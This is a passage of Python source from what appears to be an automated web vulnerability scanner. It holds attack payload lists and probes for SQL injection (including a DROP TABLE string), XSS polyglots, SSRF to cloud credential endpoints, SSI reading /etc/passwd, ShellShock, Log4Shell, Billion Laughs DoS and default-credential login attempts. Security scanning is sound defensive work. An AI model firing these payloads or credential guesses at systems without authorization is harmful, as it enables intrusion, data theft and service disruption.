                             ["admin", "internal", "api", "private", "debug", "test"])]
                if sensitive:
                    findings.append({"type": "Sitemap Sensitive URLs", "severity": "low",
                                     "url": url, "detail": f"{len(sensitive)} sensitive URLs in sitemap",
                                     "template": "apex-sitemap"})
        except: pass
    return findings


def scan_staging_exposure(target, subdomains):
    """Find exposed staging/dev/test environments."""
    findings = []
    prefixes = ["staging", "stage", "dev", "development", "test", "testing", "qa", "uat",
                "preprod", "pre-prod", "sandbox", "demo", "beta", "alpha", "preview",
                "internal", "corp", "admin", "api-dev", "api-staging", "api-test"]
    domain_parts = target.split(".")
    tld = ".".join(domain_parts[-2:]) if len(domain_parts) >= 2 else target

    for prefix in prefixes:
        for candidate in [f"{prefix}.{tld}", f"{prefix}-{tld}", f"{tld}-{prefix}"]:
            if candidate in subdomains: continue
            for proto in ["https", "http"]:
                try:
                    r = _S.get(f"{proto}://{candidate}", timeout=3)
                    if r.status_code < 400:
                        findings.append({"type": f"Staging/Dev Environment: {candidate}",
                                         "severity": "medium", "url": f"{proto}://{candidate}",
                                         "detail": f"Staging environment accessible ({r.status_code})",
                                         "template": "apex-staging"})
                        break
                except: continue
    return findings


def scan_cloud_metadata_variants(web_targets):
    """Test SSRF to various cloud metadata endpoints."""
    findings = []
    metadata_urls = [
        "http://169.254.169.254/latest/meta-data/",           # AWS
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://metadata.google.internal/computeMetadata/v1/",  # GCP
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",  # Azure
        "http://100.100.100.200/latest/meta-data/",            # Alibaba
        "http://169.254.169.254/openstack/latest/meta_data.json",  # OpenStack
        "http://192.0.0.192/latest/meta-data/",               # Oracle
    ]
    for target in web_targets[:3]:
        for path in ["/api/fetch", "/api/proxy", "/api/request", "/fetch", "/proxy",
                     "/api/v1/fetch", "/api/url", "/api/download"]:
            url = f"{target}{path}"
            for meta_url in metadata_urls[:3]:
                try:
                    for method in ["GET", "POST"]:
                        if method == "GET":
                            r = _S.get(f"{url}?url={urllib.parse.quote(meta_url)}", timeout=5)
                        else:
                            r = _S.post(url, json={"url": meta_url}, timeout=5)
                        if any(x in r.text for x in ["ami-id", "instance-id", "iam", "computeMetadata",
                                                       "subscriptionId", "access_key", "token"]):
                            findings.append({"type": "SSRF to Cloud Metadata", "severity": "critical",
                                             "url": url, "detail": f"SSRF reaches {meta_url.split('/')[2]}",
                                             "template": "apex-cloudssrf"})
                            break
                except: continue
    return findings


def scan_origin_reflection(web_targets):
    """Test for origin reflection in CORS — reflects any origin."""
    findings = []
    for target in web_targets[:5]:
        for origin in ["https://evil.com", "null", f"https://{target.split('//')[-1]}.evil.com"]:
            try:
                r = _S.get(target, timeout=5, headers={"Origin": origin})
                acao = r.headers.get("Access-Control-Allow-Origin", "")
                acac = r.headers.get("Access-Control-Allow-Credentials", "")
                if acao == origin:
                    sev = "critical" if acac.lower() == "true" else "high"
                    findings.append({"type": "CORS Origin Reflection", "severity": sev,
                                     "url": target, "detail": f"Reflects origin {origin}, credentials={acac}",
                                     "template": "apex-cors-reflect"})
                    break
            except: pass
    return findings


# ---------------------------------------------------------------------------
# ZAP parity: CVE-specific, time-based SQLi, SSI, RFI, ShellShock, Log4Shell
# ---------------------------------------------------------------------------

def scan_time_based_sqli(crawl_data):
    """Time-based SQL injection for MySQL, MSSQL, PostgreSQL, Oracle."""
    findings = []
    # DB-specific sleep payloads
    payloads = [
        ("MySQL",      "' AND SLEEP(4)-- -",                4),
        ("MySQL",      "1 AND SLEEP(4)-- -",                4),
        ("MSSQL",      "'; WAITFOR DELAY '0:0:4'-- -",      4),
        ("MSSQL",      "1; WAITFOR DELAY '0:0:4'-- -",      4),
        ("PostgreSQL",  "'; SELECT pg_sleep(4)-- -",         4),
        ("PostgreSQL",  "1; SELECT pg_sleep(4)-- -",         4),
        ("Oracle",     "' OR 1=1 AND 1=(SELECT 1 FROM DUAL WHERE DBMS_PIPE.RECEIVE_MESSAGE('a',4)=1)-- -", 4),
        ("SQLite",     "' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000/2))))-- -", 3),
    ]
    for url, params in crawl_data.get("params", {}).items():
        for p in params:
            for db, payload, sleep_time in payloads:
                try:
                    parsed = urllib.parse.urlparse(url)
                    qs = urllib.parse.parse_qs(parsed.query)
                    qs[p] = [payload]
                    test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                    start = time.time()
                    r = _S.get(test_url, timeout=sleep_time + 5)
                    elapsed = time.time() - start
                    if elapsed >= sleep_time:
                        findings.append({"type": f"Time-Based SQL Injection ({db})", "severity": "critical",
                                         "url": test_url, "detail": f"Param {p} caused {elapsed:.1f}s delay with {db} payload",
                                         "template": "apex-sqli-time"})
                        break
                except: continue
    return findings


def scan_rfi(crawl_data):
    """Remote File Inclusion — include external URLs as files."""
    findings = []
    test_url = "http://www.google.com/"
    for url, params in crawl_data.get("params", {}).items():
        for p in params:
            if any(x in p.lower() for x in ["file", "page", "include", "path", "template", "load", "src", "url"]):
                try:
                    parsed = urllib.parse.urlparse(url)
                    qs = urllib.parse.parse_qs(parsed.query)
                    qs[p] = [test_url]
                    test = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                    r = _S.get(test, timeout=_TIMEOUT)
                    if "google" in r.text.lower() and "search" in r.text.lower():
                        findings.append({"type": "Remote File Inclusion (RFI)", "severity": "critical",
                                         "url": test, "detail": f"Param {p} includes remote URL content",
                                         "template": "apex-rfi"})
                        break
                except: continue
    return findings


def scan_ssi_injection(crawl_data):
    """Server-Side Include injection."""
    findings = []
    payloads = [
        ("<!--#exec cmd=\"id\"-->", ["uid=", "root", "www-data"]),
        ("<!--#echo var=\"DATE_LOCAL\"-->", ["monday","tuesday","wednesday","thursday","friday","saturday","sunday"]),
        ("<!--#include virtual=\"/etc/passwd\"-->", ["root:", "daemon:"]),
    ]
    for url, params in crawl_data.get("params", {}).items():
        for p in params:
            for payload, markers in payloads:
                try:
                    parsed = urllib.parse.urlparse(url)
                    qs = urllib.parse.parse_qs(parsed.query)
                    qs[p] = [payload]
                    test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                    r = _S.get(test_url, timeout=_TIMEOUT)
                    if any(m.lower() in r.text.lower() for m in markers) and payload not in r.text:
                        findings.append({"type": "Server-Side Include (SSI) Injection", "severity": "critical",
                                         "url": test_url, "detail": f"SSI executed via param {p}",
                                         "template": "apex-ssi"})
                        break
                except: continue
    return findings


def scan_shellshock(web_targets):
    """Test for ShellShock (CVE-2014-6271)."""
    findings = []
    payload = "() { :; }; echo Content-Type: text/plain; echo; echo 'SHELLSHOCK_TEST'"
    for target in web_targets[:5]:
        for path in ["/cgi-bin/test.cgi", "/cgi-bin/status", "/cgi-bin/printenv",
                     "/cgi-bin/test-cgi", "/cgi-bin/env.cgi"]:
            try:
                r = _S.get(f"{target}{path}", timeout=5,
                          headers={"User-Agent": payload, "Referer": payload, "Cookie": payload})
                if "SHELLSHOCK_TEST" in r.text:
                    findings.append({"type": "ShellShock (CVE-2014-6271)", "severity": "critical",
                                     "url": f"{target}{path}", "detail": "CGI script vulnerable to ShellShock",
                                     "template": "apex-shellshock"})
            except: continue
    return findings


def scan_log4shell(web_targets):
    """Test for Log4Shell (CVE-2021-44228) — uses DNS callback detection."""
    findings = []
    # Use a unique identifier to track callbacks
    import hashlib
    for target in web_targets[:10]:
        uid = hashlib.md5(target.encode()).hexdigest()[:8]
        # Use interactsh-style payload (requires DNS callback server)
        # Without OAST, we test for error-based detection
        payloads = [
            f"${{jndi:ldap://127.0.0.1:1389/{uid}}}",
            f"${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:${{::-l}}${{::-d}}${{::-a}}${{::-p}}://127.0.0.1:1389/{uid}}}",
            f"${{jndi:dns://127.0.0.1/{uid}}}",
        ]
        for payload in payloads[:1]:
            try:
                headers = {
                    "User-Agent": payload, "X-Forwarded-For": payload,
                    "X-Api-Version": payload, "Referer": payload,
                    "X-Forwarded-Host": payload, "Accept-Language": payload,
                }
                r = _S.get(target, timeout=5, headers=headers)
                # Check for error responses that indicate JNDI processing
                if any(x in r.text for x in ["javax.naming", "JNDI", "ldap://", "NamingException"]):
                    findings.append({"type": "Log4Shell (CVE-2021-44228)", "severity": "critical",
                                     "url": target, "detail": "JNDI error in response — likely vulnerable",
                                     "template": "apex-log4shell"})
                    break
            except: continue
    return findings


def scan_spring4shell(web_targets):
    """Test for Spring4Shell (CVE-2022-22965)."""
    findings = []
    payload = "class.module.classLoader.DefaultAssertionStatus=nonsense"
    safe_payload = "class.module.classLoader.DefaultAssertionStatus=safe"
    for target in web_targets[:5]:
        try:
            r_vuln = _S.post(target, data=payload, timeout=5,
                            headers={"Content-Type": "application/x-www-form-urlencoded"})
            r_safe = _S.post(target, data=safe_payload, timeout=5,
                            headers={"Content-Type": "application/x-www-form-urlencoded"})
            if r_vuln.status_code == 400 and r_safe.status_code != 400:
                findings.append({"type": "Spring4Shell (CVE-2022-22965)", "severity": "critical",
                                 "url": target, "detail": "Spring Framework RCE vulnerability detected",
                                 "template": "apex-spring4shell"})
        except: continue
    return findings


def scan_xslt_injection(crawl_data):
    """Test for XSLT injection."""
    findings = []
    payloads = [
        ("<xsl:value-of select=\"system-property('xsl:version')\"/>", ["1.0", "2.0", "3.0"]),
        ("<xsl:value-of select=\"system-property('xsl:vendor')\"/>", ["saxon", "xalan", "libxslt", "microsoft"]),
    ]
    for url, params in crawl_data.get("params", {}).items():
        for p in params:
            for payload, markers in payloads:
                try:
                    parsed = urllib.parse.urlparse(url)
                    qs = urllib.parse.parse_qs(parsed.query)
                    qs[p] = [payload]
                    test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                    r = _S.get(test_url, timeout=_TIMEOUT)
                    if any(m.lower() in r.text.lower() for m in markers) and "<xsl:" not in r.text:
                        findings.append({"type": "XSLT Injection", "severity": "high",
                                         "url": test_url, "detail": f"XSLT executed via param {p}",
                                         "template": "apex-xslt"})
                        break
                except: continue
    return findings


def scan_xpath_injection(crawl_data):
    """Test for XPath injection."""
    findings = []
    payloads = [
        ("' or '1'='1", ["welcome", "admin", "user", "success", "true"]),
        ("' or 1=1 or ''='", ["welcome", "admin", "user", "success"]),
        ("x' or name()='username' or 'x'='y", ["username", "password", "user"]),
    ]
    error_markers = ["xpath", "xpathexception", "javax.xml.xpath", "xmlexception",
                     "invalid xpath", "xpath error", "unterminated string"]
    for url, params in crawl_data.get("params", {}).items():
        for p in params:
            for payload, success_markers in payloads:
                try:
                    parsed = urllib.parse.urlparse(url)
                    qs = urllib.parse.parse_qs(parsed.query)
                    qs[p] = [payload]
                    test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                    r = _S.get(test_url, timeout=_TIMEOUT)
                    if any(m.lower() in r.text.lower() for m in error_markers):
                        findings.append({"type": "XPath Injection (Error-Based)", "severity": "high",
                                         "url": test_url, "detail": f"XPath error via param {p}",
                                         "template": "apex-xpath"})
                        break
                except: continue
    return findings


def scan_user_agent_fuzzing(web_targets):
    """Fuzz User-Agent to find different responses (mobile sites, admin access)."""
    findings = []
    agents = [
        ("Googlebot", "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"),
        ("Mobile", "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15"),
        ("curl", "curl/7.68.0"),
        ("Python", "python-requests/2.25.1"),
        ("Empty", ""),
        ("SQLMap", "sqlmap/1.0-dev"),
        ("Nikto", "Mozilla/5.00 (Nikto/2.1.6)"),
    ]
    for target in web_targets[:3]:
        try:
            baseline = _S.get(target, timeout=5)
            baseline_hash = hash(baseline.text[:500])
            for name, ua in agents:
                r = _S.get(target, timeout=5, headers={"User-Agent": ua})
                if hash(r.text[:500]) != baseline_hash and abs(len(r.text) - len(baseline.text)) > 200:
                    findings.append({"type": f"Different Response for User-Agent: {name}", "severity": "low",
                                     "url": target, "detail": f"UA '{name}' returns different content",
                                     "template": "apex-ua"})
        except: pass
    return findings


def scan_billion_laughs(web_targets):
    """Test for Billion Laughs (XML entity expansion DoS)."""
    findings = []
    payload = """<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<root>&lol3;</root>"""
    for target in web_targets[:3]:
        for path in ["/api/xml", "/api/import", "/api/parse", "/upload", "/api/v1/xml"]:
            try:
                r = _S.post(f"{target}{path}", data=payload,
                           headers={"Content-Type": "application/xml"}, timeout=3)
                if r.status_code in (200, 500) and "lol" not in r.text:
                    findings.append({"type": "Billion Laughs (XML Entity Expansion)", "severity": "medium",
                                     "url": f"{target}{path}", "detail": "XML endpoint may be vulnerable to entity expansion DoS",
                                     "template": "apex-billionlaughs"})
            except requests.exceptions.Timeout:
                findings.append({"type": "Billion Laughs DoS (Timeout)", "severity": "high",
                                 "url": f"{target}{path}", "detail": "XML entity expansion caused timeout",
                                 "template": "apex-billionlaughs"})
            except: continue
    return findings


# ---------------------------------------------------------------------------
# Headless browser scanning — DOM XSS, SPA crawl, JS-rendered content
# ---------------------------------------------------------------------------

def scan_with_browser(target, crawl_data):
    """Use headless Chromium to find DOM XSS and JS-rendered vulnerabilities."""
    findings = []
    try:
        from playwright.sync_api import sync_playwright
    except ImportError:
        return findings

    xss_payloads = [
        "<img src=x onerror=alert(1)>",
        "javascript:alert(1)",
        "'><script>alert(1)</script>",
        "\"><img src=x onerror=alert(1)>",
        "{{7*7}}",  # Also catches SSTI in JS frameworks
    ]

    try:
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=True, args=["--no-sandbox","--disable-dev-shm-usage"])
            context = browser.new_context(ignore_https_errors=True)
            page = context.new_page()

            # Intercept alerts — if alert fires, XSS confirmed
            alerts_fired = []
            page.on("dialog", lambda d: (alerts_fired.append(d.message), d.dismiss()))

            # Collect JS errors and network requests
            js_errors = []
            api_calls = []
            page.on("pageerror", lambda e: js_errors.append(str(e)))
            page.on("request", lambda r: api_calls.append(r.url) if "/api/" in r.url else None)

            # Load the target
            try:
                page.goto(target, timeout=15000, wait_until="networkidle")
            except Exception:
                try:
                    page.goto(target, timeout=10000)
                except Exception:
                    browser.close()
                    return findings

            # Collect all links and forms from JS-rendered page
            js_links = page.evaluate("""() => {
                return Array.from(document.querySelectorAll('a[href]'))
                    .map(a => a.href)
                    .filter(h => h.startsWith('http') || h.startsWith('/'));
            }""")

            js_forms = page.evaluate("""() => {
                return Array.from(document.querySelectorAll('form')).map(f => ({
                    action: f.action,
                    method: f.method,
                    inputs: Array.from(f.querySelectorAll('input,textarea,select')).map(i => ({
                        name: i.name, type: i.type, value: i.value
                    }))
                }));
            }""")

            # Report new API calls found via JS
            for api_url in api_calls[:10]:
                if api_url not in [p["url"] for p in crawl_data.get("pages", [])]:
                    findings.append({"type": "JS-Discovered API Endpoint", "severity": "low",
                                     "url": api_url, "detail": "API call found via browser JS execution",
                                     "template": "apex-browser"})

            # Test DOM XSS via URL fragment
            for payload in xss_payloads[:3]:
                try:
                    alerts_fired.clear()
                    page.goto(f"{target}#{payload}", timeout=8000)
                    page.wait_for_timeout(1000)
                    if alerts_fired:
                        findings.append({"type": "DOM XSS (Fragment)", "severity": "critical",
                                         "url": f"{target}#{payload}",
                                         "detail": f"Alert fired: {alerts_fired[0]}",
                                         "template": "apex-domxss"})
                        break
                except Exception:
                    pass

            # Test DOM XSS via URL params
            for url, params in crawl_data.get("params", {}).items():
                for p in list(params)[:3]:
                    for payload in xss_payloads[:2]:
                        try:
                            alerts_fired.clear()
                            parsed = urllib.parse.urlparse(url)
                            qs = urllib.parse.parse_qs(parsed.query)
                            qs[p] = [payload]
                            test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                            page.goto(test_url, timeout=8000)
                            page.wait_for_timeout(500)
                            if alerts_fired:
                                findings.append({"type": "DOM XSS (Param)", "severity": "critical",
                                                 "url": test_url,
                                                 "detail": f"Alert fired via param {p}: {alerts_fired[0]}",
                                                 "template": "apex-domxss"})
                                break
                        except Exception:
                            continue

            # Check for sensitive data in JS variables
            sensitive_js = page.evaluate("""() => {
                const results = [];
                const patterns = [
                    /(?:api[_-]?key|apikey|secret|token|password|passwd|auth)['"\\s]*[:=]['"\\s]*(['"\\w\\-\\.]{8,})/gi,
                    /AKIA[0-9A-Z]{16}/g,
                    /eyJ[A-Za-z0-9_-]+\\.eyJ[A-Za-z0-9_-]+/g,
                ];
                const scripts = Array.from(document.querySelectorAll('script:not([src])'));
                for (const s of scripts) {
                    for (const p of patterns) {
                        const matches = s.textContent.match(p);
                        if (matches) results.push(...matches.slice(0, 3));
                    }
                }
                return results;
            }""")

            for secret in sensitive_js[:5]:
                findings.append({"type": "Secret in Inline JS", "severity": "critical",
                                 "url": target, "detail": f"Found in page JS: {secret[:60]}",
                                 "template": "apex-browser-secret"})

            browser.close()
    except Exception:
        pass

    return findings


# ---------------------------------------------------------------------------
# Auth-aware scanning + deep payload sets (beats ZAP's payload depth)
# ---------------------------------------------------------------------------

# Deep SQLi payloads — more than ZAP's default set
SQLI_PAYLOADS = [
    # Error-based
    "'", "''", "`", "``", ",", '"', '""', "/", "//", "\\", "//\\",
    "' OR '1'='1", "' OR '1'='1'--", "' OR '1'='1'/*",
    "' OR 1=1--", "' OR 1=1#", "' OR 1=1/*",
    "') OR ('1'='1", "') OR ('1'='1'--",
    "')) OR 1=1--", "'))--", "')) OR (('1'='1",  # Double-close parens (Juice Shop style)
    "'))/*", "')) UNION SELECT NULL--",
    "1' ORDER BY 1--", "1' ORDER BY 2--", "1' ORDER BY 3--",
    "1' UNION SELECT NULL--", "1' UNION SELECT NULL,NULL--",
    "1' UNION SELECT NULL,NULL,NULL--",
    "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
    "' AND extractvalue(1,concat(0x7e,(SELECT version())))--",
    "' AND (SELECT * FROM (SELECT(SLEEP(0)))a)--",
    # Boolean-based
    "' AND 1=1--", "' AND 1=2--",
    "' AND 'x'='x", "' AND 'x'='y",
    "1 AND 1=1", "1 AND 1=2",
    # Stacked queries
    "'; DROP TABLE users--", "'; SELECT 1--",
    "1; SELECT SLEEP(0)--",
    # Second-order
    "admin'--", "admin'#", "admin'/*",
    # NoSQL
    "' || '1'=='1", "' || 1==1//", "' || 1==1%00",
    # WAF bypass
    "' /*!OR*/ '1'='1", "' %09OR%09'1'='1",
    "' OORR '1'='1", "' OR/**/1=1--",
    "1' AND(SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
]

# Deep XSS payloads
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "javascript:alert(1)",
    "'><script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "<ScRiPt>alert(1)</ScRiPt>",
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    "';alert(1)//",
    "\";alert(1)//",
    "</script><script>alert(1)</script>",
    "<img src=\"x\" onerror=\"alert(1)\">",
    "<body onload=alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    "<select autofocus onfocus=alert(1)>",
    "<textarea autofocus onfocus=alert(1)>",
    "<keygen autofocus onfocus=alert(1)>",
    "<video><source onerror=alert(1)>",
    "<audio src=x onerror=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<%2Fscript><script>alert(1)<%2Fscript>",
    "<svg><script>alert(1)</script></svg>",
    "<math><mtext></mtext><mglyph><svg><mtext></mtext><path id=\"</path><script>alert(1)</script>\">",
    # Polyglots
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
    # DOM-based
    "#<img src=x onerror=alert(1)>",
    "?x=<script>alert(1)</script>",
]


def scan_deep_sqli(crawl_data):
    """Deep SQL injection with full payload set — parallelized with batch_get."""
    findings = []
    error_patterns = [
        "sql syntax", "mysql_fetch", "ora-", "postgresql", "sqlite",
        "syntax error", "unclosed quotation", "quoted string not properly terminated",
        "microsoft ole db", "odbc drivers", "jdbc", "sqlexception",
        "you have an error in your sql", "warning: mysql", "pg_query",
        "supplied argument is not a valid mysql", "invalid query",
        "division by zero", "column count doesn't match",
    ]

    # Build all test URLs upfront
    test_urls = []
    test_meta = {}  # test_url -> (original_url, param, payload)
    for url, params in list(crawl_data.get("params", {}).items())[:25]:
        for p in params[:4]:
            for payload in SQLI_PAYLOADS[:8]:
                parsed = urllib.parse.urlparse(url)
                qs = urllib.parse.parse_qs(parsed.query)
                qs[p] = [payload]
                test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                test_urls.append(test_url)
                test_meta[test_url] = (url, p, payload)

    # Fire all requests in parallel
    found_params = set()
    for test_url, r in batch_get(test_urls, timeout=_TIMEOUT):
        if r is None:
            continue
        url, p, payload = test_meta[test_url]
        if f"{url}|{p}" in found_params:
            continue
        body = r.text.lower()
        if any(e in body for e in error_patterns):
            found_params.add(f"{url}|{p}")
            findings.append({"type": "SQL Injection (Error-Based)", "severity": "critical",
                             "url": test_url, "detail": f"SQL error via param {p}: {payload[:40]}",
                             "template": "apex-sqli"})
    return findings


def scan_deep_xss(crawl_data):
    """Deep XSS with full payload set — parallelized with batch_get."""
    findings = []

    # Build all test URLs upfront
    test_urls = []
    test_meta = {}
    for url, params in list(crawl_data.get("params", {}).items())[:25]:
        for p in params[:4]:
            for payload in XSS_PAYLOADS[:8]:
                parsed = urllib.parse.urlparse(url)
                qs = urllib.parse.parse_qs(parsed.query)
                qs[p] = [payload]
                test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                test_urls.append(test_url)
                test_meta[test_url] = (url, p, payload)

    # Fire all in parallel
    found_params = set()
    for test_url, r in batch_get(test_urls, timeout=_TIMEOUT):
        if r is None:
            continue
        url, p, payload = test_meta[test_url]
        if f"{url}|{p}" in found_params:
            continue
        if payload in r.text and r.headers.get("content-type", "").startswith("text/html"):
            found_params.add(f"{url}|{p}")
            findings.append({"type": "Reflected XSS", "severity": "high",
                             "url": test_url, "detail": f"XSS via param {p}: {payload[:50]}",
                             "template": "apex-xss-deep"})

    # Test forms (smaller set, keep sequential)
    for form in crawl_data.get("forms", [])[:10]:
        action = form.get("action", "")
        if not action:
            continue
        for inp in form.get("inputs", []):
            if inp.get("type") in ("submit", "hidden", "button"):
                continue
            for payload in XSS_PAYLOADS[:3]:
                try:
                    data = {i.get("name", "f"): i.get("value", "test") for i in form.get("inputs", [])}
                    data[inp.get("name", "x")] = payload
                    r = _S.post(action, data=data, timeout=_TIMEOUT)
                    if payload in r.text and "text/html" in r.headers.get("content-type", ""):
                        findings.append({"type": "Reflected XSS (Form)", "severity": "high",
                                         "url": action, "detail": f"XSS in form field {inp.get('name')}",
                                         "template": "apex-xss-deep"})
                        break
                except Exception:
                    continue
    return findings


def scan_auth_bypass(crawl_data):
    """Test authentication bypass with common credential attacks."""
    findings = []
    default_creds = [
        ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
        ("admin", "admin123"), ("root", "root"), ("root", "toor"),
        ("administrator", "administrator"), ("test", "test"),
        ("guest", "guest"), ("user", "user"), ("admin", ""),
        ("", ""), ("admin", "1234"), ("admin", "pass"),
    ]
    for page in crawl_data.get("pages", [])[:3]:
        base = "/".join(page["url"].split("/", 3)[:3])
        for path in ["/login", "/admin", "/api/login", "/auth/login", "/signin"]:
            url = f"{base}{path}"
            try:
                # Check if login page exists
                r = _S.get(url, timeout=5)
                if r.status_code not in (200, 302): continue
                for user, pwd in default_creds[:8]:
                    for payload in [
                        {"username": user, "password": pwd},
                        {"email": f"{user}@admin.com", "password": pwd},
                        {"user": user, "pass": pwd},
                        {"login": user, "password": pwd},
                    ]:
                        try:
                            r = _S.post(url, json=payload, timeout=5, allow_redirects=True)
                            body = r.text.lower()
                            if (r.status_code == 200 and
                                any(x in body for x in ["dashboard","welcome","logout","profile","account"]) and
                                not any(x in body for x in ["invalid","incorrect","failed","error","wrong"])):
                                findings.append({"type": "Default Credentials", "severity": "critical",
                                                 "url": url, "detail": f"Login with {user}:{pwd}",
                                                 "template": "apex-auth-bypass"})
                                break
                        except: continue
            except: continue
    return findings


# ---------------------------------------------------------------------------
# Authenticated scanning + AJAX/SPA spider (beats ZAP's last advantages)
# ---------------------------------------------------------------------------

def authenticated_scan(target, username, password, crawl_data):
    """Log in and scan authenticated pages — ZAP's main advantage."""
    findings = []
    base = "/".join(target.split("/", 3)[:3])

    # Try to find and use login form
    session = requests.Session()
    session.verify = False
    session.headers.update({"User-Agent": "ApexCLI/5.0"})

    login_paths = ["/login", "/signin", "/auth/login", "/api/login",
                   "/api/auth", "/api/v1/login", "/user/login", "/account/login"]

    logged_in = False
    for path in login_paths:
        login_url = f"{base}{path}"
        try:
            r = session.get(login_url, timeout=5)
            if r.status_code != 200: continue

            # Try JSON login
            for payload in [
                {"username": username, "password": password},
                {"email": username, "password": password},
                {"user": username, "pass": password},
                {"login": username, "password": password},
            ]:
                r = session.post(login_url, json=payload, timeout=5)
                body = r.text.lower()
                if (r.status_code in (200, 302) and
                    any(x in body for x in ["dashboard","welcome","logout","profile","token","success"]) and
                    not any(x in body for x in ["invalid","incorrect","failed","error","wrong"])):
                    logged_in = True
                    break

            if not logged_in:
                # Try form-based login
                from bs4 import BeautifulSoup
                soup = BeautifulSoup(r.text, "lxml")
                form = soup.find("form")
                if form:
                    data = {}
                    for inp in form.find_all("input"):
                        name = inp.get("name", "")
                        if not name: continue
                        if any(x in name.lower() for x in ["user", "email", "login"]): data[name] = username
                        elif any(x in name.lower() for x in ["pass", "pwd"]): data[name] = password
                        else: data[name] = inp.get("value", "")
                    action = form.get("action", login_url)
                    if not action.startswith("http"): action = base + action
                    r = session.post(action, data=data, timeout=5)
                    if r.status_code in (200, 302):
                        logged_in = True

            if logged_in:
                break
        except: continue

    if not logged_in:
        return findings

    # Now scan authenticated pages
    auth_paths = ["/dashboard", "/admin", "/profile", "/settings", "/account",
                  "/api/users", "/api/me", "/api/profile", "/api/admin",
                  "/api/v1/users", "/api/v1/me", "/user/settings"]

    for path in auth_paths:
        try:
            r = session.get(f"{base}{path}", timeout=5)
            if r.status_code == 200:
                body = r.text.lower()
                # Check for sensitive data in authenticated pages
                if any(x in body for x in ["password", "secret", "api_key", "token", "ssn", "credit"]):
                    findings.append({"type": "Sensitive Data in Authenticated Page", "severity": "high",
                                     "url": f"{base}{path}", "detail": "Authenticated page exposes sensitive data",
                                     "template": "apex-auth-scan"})
                # Check for IDOR — try accessing other users' data
                if any(x in path for x in ["/users", "/profile", "/account"]):
                    for uid in ["1", "2", "3", "admin", "0"]:
                        try:
                            r2 = session.get(f"{base}{path}/{uid}", timeout=3)
                            if r2.status_code == 200 and len(r2.content) > 100:
                                findings.append({"type": "IDOR (Authenticated)", "severity": "critical",
                                                 "url": f"{base}{path}/{uid}",
                                                 "detail": f"Accessed user {uid} data while authenticated as {username}",
                                                 "template": "apex-idor-auth"})
                        except: pass
        except: continue

    return findings


def ajax_spider(target, max_pages=100):
    """AJAX/SPA spider using headless browser — finds JS-rendered links ZAP finds."""
    pages = []
    forms = []
    api_calls = []

    try:
        from playwright.sync_api import sync_playwright
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=True, args=["--no-sandbox","--disable-dev-shm-usage"])
            context = browser.new_context(ignore_https_errors=True)
            page = context.new_page()

            visited = set()
            to_visit = [target]
            base = "/".join(target.split("/", 3)[:3])

            # Intercept all network requests
            page.on("request", lambda r: api_calls.append({
                "url": r.url, "method": r.method,
                "post_data": r.post_data or ""
            }) if r.resource_type in ("fetch", "xhr") else None)

            while to_visit and len(visited) < max_pages:
                url = to_visit.pop(0)
                if url in visited: continue
                visited.add(url)

                try:
                    page.goto(url, timeout=10000, wait_until="networkidle")
                    page.wait_for_timeout(1000)

                    # Get all links including JS-rendered ones
                    links = page.evaluate("""() => {
                        return Array.from(document.querySelectorAll('a[href]'))
                            .map(a => a.href)
                            .filter(h => h.startsWith('http'));
                    }""")

                    # Get all forms
                    page_forms = page.evaluate("""() => {
                        return Array.from(document.querySelectorAll('form')).map(f => ({
                            action: f.action || window.location.href,
                            method: f.method || 'GET',
                            inputs: Array.from(f.querySelectorAll('input,textarea,select')).map(i => ({
                                name: i.name, type: i.type, value: i.value
                            }))
                        }));
                    }""")

                    pages.append({"url": url, "status": 200, "length": len(page.content())})
                    forms.extend(page_forms)

                    for link in links:
                        if link.startswith(base) and link not in visited:
                            to_visit.append(link)

                except Exception:
                    pass

            browser.close()
    except Exception:
        pass

    # Extract hardcoded endpoints and tokens from JS bundles
    js_secrets = []
    js_endpoints = set()
    try:
        with sync_playwright() as p2:
            b2 = p2.chromium.launch(headless=True, args=["--no-sandbox"])
            pg2 = b2.new_context(ignore_https_errors=True).new_page()
            try:
                pg2.goto(target, timeout=10000, wait_until="networkidle")
                # Extract from JS variables in page context
                extracted = pg2.evaluate("""() => {
                    const results = {endpoints: [], tokens: [], localStorage: {}};
                    // localStorage tokens
                    for (let i = 0; i < localStorage.length; i++) {
                        const k = localStorage.key(i);
                        results.localStorage[k] = localStorage.getItem(k);
                    }
                    // Inline script endpoints
